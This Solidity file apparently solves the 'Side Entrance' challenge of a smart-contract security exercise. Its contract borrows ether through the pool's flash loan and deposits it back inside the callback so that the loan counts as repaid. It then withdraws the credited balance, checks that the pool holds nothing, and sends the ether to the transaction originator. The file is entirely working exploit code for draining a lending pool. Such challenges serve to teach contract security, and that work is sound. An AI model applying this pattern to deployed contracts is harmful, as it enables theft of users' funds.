// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";
import "./SideEntranceLenderPool.sol";

contract SideEntranceLenderPoolHack is IFlashLoanEtherReceiver {
    function hack(SideEntranceLenderPool _pl) external payable {
        _pl.flashLoan(msg.value); // this will call "execute" below
        _pl.withdraw();
        require(address(_pl).balance == 0, "bal is not zero!");
        payable(tx.origin).transfer(address(this).balance);
    }

    function execute() external override payable {
        SideEntranceLenderPool(msg.sender).deposit{value: msg.value}();
    }

    receive () external payable {}
}